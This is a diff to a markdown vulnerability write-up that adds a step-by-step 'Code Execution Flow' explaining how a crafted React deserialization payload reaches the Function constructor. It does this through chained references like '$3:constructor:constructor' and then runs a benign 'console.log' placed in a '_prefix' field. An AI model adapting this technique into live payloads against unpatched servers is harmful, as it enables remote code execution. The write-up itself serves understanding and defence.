@@ -210,7 +210,7 @@ This object orchestrates the exploit:
 
 Note: `resolved_model` means object has been successfully resolved as a complete data model and `'reason': 0,` means no error 
 
-### The Execution Flow
+### Payload Execution Flow
 
 When React deserializes this payload, here's what happens:
 
@@ -235,6 +235,81 @@ When React deserializes this payload, here's what happens:
     // The '//3' is commented out
     ```
     
+### Code Execution Flow
+
+**1. Initial Reference Resolution**
+
+When `getOutlinedModel` is called with reference `'$1'`:
+
+```
+reference = '$1'
+path = ['1']
+id = parseInt('1', 16) = 1
+chunk = getChunk(response, 1)
+```
+
+**2. Chunk Processing**
+
+The chunk at id=1 has `status: 'resolved_model'`, triggering:
+
+```javascript
+case RESOLVED_MODEL:
+    initializeModelChunk(chunk);
+```
+
+**3. Model Initialization**
+
+`initializeModelChunk` parses the `value` string:
+
+```json
+{"then":"$3:map","0":{"then":"$B3"},"length":1}
+```
+
+This creates an object with:
+
+- A `then` property referencing `'$3:map'` (triggering promise-like behavior)
+- Property `'0'` with nested `then: '$B3'`
+- A `length` property (making it array-like)
+
+**4. Property Traversal Exploitation**
+
+The critical vulnerability occurs in this loop:
+
+```javascript
+for (let i = 1; i < path.length; i++) {
+    value = value[path[i]];
+}
+```
+
+When processing reference `'$3:map'`, the path becomes `['3', 'map']`, causing:
+
+```javascript
+value = value['map']  // Accesses Array.prototype.map
+```
+
+**5. Constructor Chain Access**
+
+The payload in key '4' exploits the `_formData` structure:
+
+```javascript
+'_formData': {
+    'get': '$3:constructor:constructor'
+}
+```
+
+This reference chain resolves as:
+
+1. `$3` → Empty array `[]`
+2. `:constructor` → `Array.constructor` (the Array function)
+3. `:constructor` → `Function.constructor` (the Function constructor)
+
+**6. Code Execution**
+
+The `_prefix` field contains the malicious code:
+
+```javascript
+'_prefix': 'console.log(7*7+1)//'
+```
 
 ### Why This Works
 
